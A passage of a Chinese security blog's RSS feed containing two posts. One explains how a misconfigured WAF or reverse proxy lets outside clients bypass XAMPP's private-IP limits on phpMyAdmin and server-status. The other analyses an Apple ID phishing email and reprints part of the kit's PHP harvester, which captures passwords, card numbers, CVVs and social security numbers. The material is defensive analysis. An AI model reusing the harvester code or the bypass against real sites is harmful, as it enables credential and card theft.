      &lt;p&gt;Google 基於效能及有效性的考量，在 Android 系統上預設停用&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;憑證撤銷檢查&lt;/a&gt;&lt;br /&gt; &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;OWASP 的 Android 範例中，內含的 PUB_KEY 是錯誤的 (最後更改日期 2014/08/14) &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/</link>
                <guid>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development</guid>
                <pubDate>Fri, 15 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>設備不良設定帶來的安全風險：以 WAF 為例</title>
                <description>&lt;p&gt;過去談到網站安全，通常會使用防火牆或 IDS 進行防護。但近年來網站安全議題都是以網頁應用程式的漏洞居多，無法單靠防火牆阻擋。以 OWASP Top 10 2013 的第一名 Injection 而言，多半是程式撰寫方法不嚴謹所造成，因此才有了網頁應用程式防火牆 (Web Application Firewall, WAF) 的出現。&lt;/p&gt;

&lt;p&gt;有了 WAF 就是萬靈丹了嗎？就算有各種資安設備，但缺乏安全的設定，有的時候反而會讓系統陷入安全風險中。我們就以 Reverse Proxy 或 WAF 設備來探討不佳設定帶來的安全風險。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;waf-搭配不佳的設定會帶來什麼危害&quot;&gt;WAF 搭配不佳的設定會帶來什麼危害？&lt;/h3&gt;

&lt;p&gt;以常見的 mod_proxy 搭配 mod_security 的方案來看，通常使用 Reverse Proxy 或 Transparent Proxy 為其架構，透過 Proxy 的方式在 Client 與 Web Server 之間，對 HTTP Request / Response 進行過濾；以 HTTP Request 為例，當 WAF 偵測到 Client 端的請求中有 SQL Injection 語法時候，將會阻斷這個連線防止駭客攻擊。&lt;/p&gt;

&lt;p&gt;在這種架構下的 WAF 看似對後端的伺服器多了一份保障，但也並非完美。其問題是後端的 Web Server 在透過 WAF 存取的情況下，無法得知來自 Client 端的來源 IP，相反的 Web Server 能看到的 IP 都將是 WAF 的 IP (REMOTE ADDR)，在這種情況下可能造成 Client 端可以存取受 IP 來源限制的系統。延伸閱讀：&lt;a href=&quot;http://devco.re/blog/2014/06/19/client-ip-detection/&quot;&gt;如何正確的取得使用者 IP？&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;以下圖為例，網站本身只允許 192.168.x.x 的網段連線，如果今天 Client IP 是 1.1.1.1，將無法存取該網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;限制 IP 存取&quot; title=&quot;限制 IP 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;但在有建置 WAF 的架構之下，Client 透過 WAF 存取網站，網站得到的 IP 會是 WAF 的 IP：192.168.1.10，因此允許連線，Client 因而取得原本需在內網才能存取的資料。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;因為 WAF 而繞過 IP 限制&quot; title=&quot;因為 WAF 而繞過 IP 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;實際案例&quot;&gt;實際案例&lt;/h3&gt;

&lt;p&gt;我們以常見的 Web Server 整合包 XAMPP 為例，在預設的 http-xampp.conf 設定檔中限制了一些管理頁面只能由 Private IP 存取，如 /security 、 /webalizer 、 /phpmyadmin 、 /server-status 、 /server-info 等，此時 WAF 的 IP 若為 Private IP，依 XAMPP 預設設定，WAF 將可以存取這些受 IP 限制的資源，當 WAF 存取完資源後又將內容回傳給 Client 端。&lt;/p&gt;

&lt;p&gt;http-xampp.conf 預設設定&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;LocationMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Allow&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; ::1 127.0.0.0/8 \
                fc00::/7 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 \
                fe80::/10 169.254.0.0/16
         &lt;span class=&quot;nc&quot;&gt;ErrorDocument&lt;/span&gt; 403 /error/XAMPP_FORBIDDEN.html.var
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;LocationMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;如果照著預設的設定，以現成的案例來看，能夠存取 Apache Server 的系統狀態，其中可以看到網站所有連線以及 URI 等資料。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;預設開放 Apache 伺服器狀態&quot; title=&quot;預設開放 Apache 伺服器狀態&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;並且可以直接讀取 phpMyAdmin 介面，並且至資料庫中新增、修改、刪除資料，甚至直接上傳 webshell 進入主機。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;直接進入 phpMyAdmin 管理介面&quot; title=&quot;直接進入 phpMyAdmin 管理介面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;XAMPP 也內建了網站記錄分析工具 webalizer，透過這個介面可以知道網站所有進入點的流量、統計數據等。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;網站記錄分析工具 webalizer&quot; title=&quot;網站記錄分析工具 webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;小結&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;如果建置了 WAF，有關 IP 的設定必須要從 WAF 支援的 HTTP Header 中取出使用者的 IP (REMOTE_ADDR)，才能讓原本網站的 IP 限制生效。在這種設定錯誤或是對 WAF 架構不瞭解的情況下，WAF 反而成為駭客繞過 Private IP 限制的跳板，就如同為駭客開了一個後門。因此在使用資安設備時，必須瞭解其架構。別讓資安設備、安全機制，反而使得伺服器更不安全。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/18/waf-configuration-security-issue/</link>
                <guid>https://devco.re/blog/2014/07/18/waf-configuration-security-issue</guid>
                <pubDate>Fri, 18 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Apple ID 釣魚郵件案例</title>
                <description>&lt;p&gt;今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID 釣魚信&quot; title=&quot;Apple ID 釣魚信&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;如何判別釣魚信呢&quot;&gt;如何判別釣魚信呢？&lt;/h3&gt;

&lt;p&gt;先來談談要如何判別釣魚信呢。我們可以從四個要素來看：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;標題&lt;/li&gt;
  &lt;li&gt;寄件者&lt;/li&gt;
  &lt;li&gt;內文&lt;/li&gt;
  &lt;li&gt;連結&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;標題&quot;&gt;標題&lt;/h4&gt;

&lt;p&gt;首先，這封信的標題非常假，一般來說公司不會使用這類標題，這種判斷比較需要經驗。釣魚信件會使用非常聳動、吸引你去做動作的標題。例如常見的「你的帳號遭到停用」、「更換帳號資訊通知」等。點下連結就會帶你去假造的頁面騙你輸入密碼，千萬別傻傻當真。&lt;/p&gt;

&lt;h4 id=&quot;寄件者&quot;&gt;寄件者&lt;/h4&gt;

&lt;p&gt;寄件者通常是釣魚信一定會加強假造的部分，利用官方存在的信箱或是他人的信箱寄信，加強你的信任。不過需要特別注意的是：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;寄件者的欄位是可以假造、隨意填寫的，千萬不要直接信任。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;以這封信為例，寄件者「service@apple.com」是不存在的。當然這個欄位可以假造，但連假造都錯，實在是非常不用心。&lt;/p&gt;

&lt;h4 id=&quot;內文&quot;&gt;內文&lt;/h4&gt;

&lt;p&gt;信件的內文就是精華了，要怎麼做出一封很像官方的信件，又要誘使人去點選，實在是一門藝術。精心設計的釣魚信、社交工程、APT 郵件，通常都會針對受害者客製化，調查身邊的社交圈、常談的話題、常用的服務、會點擊的郵件，來製造一個一定會中獎的信件。&lt;/p&gt;

&lt;p&gt;當然很多時候攻擊者調查不足，還是會出現蛛絲馬跡的。例如來自中國的惡意郵件，常會出現「&lt;strong&gt;尊敬的用戶您好&lt;/strong&gt;」這種在台灣人眼中看了很彆扭的詞彙。如果出現了不常見的用詞，就非常有可能是一個假造的惡意郵件，千萬不要傻傻的點選連結或附件。&lt;/p&gt;

&lt;p&gt;再回頭來以這封信為例，最大的破綻除了非制式的內文之外，就屬署名了。明明是假造「Apple Customer Support」的來信，最下面卻簽署「Microsoft Privacy and cookies Developers」，有沒有搞錯？可以再用點心嗎？&lt;/p&gt;

&lt;h4 id=&quot;連結&quot;&gt;連結&lt;/h4&gt;

&lt;p&gt;最後的重點就是信件中的釣魚連結了，通常這個連結會帶你前往一個長得跟官方網站一模一樣的登入頁面，騙你輸入帳號密碼登入來竊取。在點選超連結之前，一定要先看一下這個連結前往的位置是不是官方的位置，例如是 Apple 的信件通常就會是前往 Apple.com 自己的網域名稱。當然更要特別注意的是假造的網域名稱，例如使用「App1e.com」來偽裝成「Apple.com」，也是非常常見的。&lt;/p&gt;

&lt;p&gt;這封信中使用了最不用心的用法，就是直接拿釣魚網站的 URL 來當連結，一來長得跟官方網域根本不像，二來落落長的連結，到底是想要騙誰點選呢？&lt;/p&gt;

&lt;h3 id=&quot;信件標頭藏有攻擊者的蛛絲馬跡&quot;&gt;信件標頭藏有攻擊者的蛛絲馬跡&lt;/h3&gt;

&lt;p&gt;收到惡意郵件、釣魚郵件，一定要好好看信件的標頭檔（Header）。裡面通常可以看到攻擊者發信的來源，例如是自己架設的發信伺服器或者是使用肉雞來發信。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID 釣魚信 Header&quot; title=&quot;Apple ID 釣魚信 Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;信件標頭最重要的就是「Received」這個部分，要由下往上閱讀。從這邊我們可以看到信件的流向，從攻擊發起者到發信伺服器，中間經過其他伺服器的轉送，最後到收到釣魚信件的郵件伺服器。因此從最下面的 Received 位置，我們可以知道攻擊者是從「selecttr@cloud.httpdns.co」來寄送信件的，因此 cloud.httpdns.co 很有可能就是攻擊者的伺服器，或者是被駭來發信的伺服器。&lt;/p&gt;

&lt;p&gt;如果覺得信件的標頭太長難以閱讀，可以利用 Google 提供的工具「&lt;a href=&quot;https://toolbox.googleapps.com/apps/messageheader/&quot;&gt;Google Apps Toolbox - Messageheader&lt;/a&gt;」。只要把信件的標頭貼上，他就會自動分析信件的流向，如下圖。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;檢查信件 header&quot; title=&quot;檢查信件 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;釣魚網頁也請你注重安全啊&quot;&gt;釣魚網頁，也請你注重安全啊。&lt;/h3&gt;

&lt;p&gt;接著我們來看一下釣魚頁面。通常「正常」的釣魚頁面都會做得跟官方一模一樣，因為通常攻擊者都會直接把官方網站上面的 HTML 直接下載下來修改。如果有做得不像的，就真的是太不用心的攻擊者。&lt;/p&gt;

&lt;p&gt;我們可以看到這個釣魚頁面做得非常像，上面要你輸入帳號、密碼、姓名、生日、信用卡號等資訊，非常惡劣。唯有網址實在是太假，希望沒有人眼拙真的以為這是 Apple 的網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID 釣魚網頁&quot; title=&quot;Apple ID 釣魚網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;秉持的資安研究員的好習慣，我們把網址子目錄去掉，看看網站的根目錄長什麼樣子，結果讓人跌破眼鏡。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;釣魚網頁開放目錄瀏覽&quot; title=&quot;釣魚網頁開放目錄瀏覽&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;釣魚網站也請你注重安全啊！&lt;/strong&gt;這個網站大剌剌的開著目錄索引，讓我們可以看到網站上的各個目錄、檔案。除了 Apple 的釣魚網頁之外，甚至有釣魚網頁的原始碼「connect-info.zip」，更有著其他釣魚網頁在同個站上。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;站上其他釣魚頁面&quot; title=&quot;站上其他釣魚頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;既然可以瀏覽，那我們來看看釣魚網頁的原始碼寫得怎樣。抓下來解開之後會看到完整的釣魚網頁，以及接收受騙人資料的主程式「Snd.php」。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;下載釣魚網頁原始碼&quot; title=&quot;下載釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;釣魚網頁的程式寫得非常簡單，僅把網頁上接收到的被害人資料、IP，寄送到他的信箱「 justforhacke@gmail.com 」，寄送完畢後會自動導向到官方的頁面偽裝。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;釣魚網頁原始碼&quot; title=&quot;釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果釣魚網頁寫得不好，甚至我們有機會可以攻擊他釣魚網頁上的漏洞，直接取得主機的權限，解救世人。從原始碼我們一目了然釣魚網頁的行為、寫法，也可以尋找有無攻擊的機會。&lt;/p&gt;

&lt;h4 id=&quot;釣魚網頁原始碼備份&quot;&gt;釣魚網頁原始碼備份&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gethostbyaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;------------+| AppLe VbV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Apple ID                    : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee000&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Password                    : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee001&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Full Name                   : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee01&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Date of Birth               : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee02&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee3&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee4&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Number Of Credit Card       : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;CVC (CVV)                   : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Expiration Date             : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee7&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee8&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Social Security Number      : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee9&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
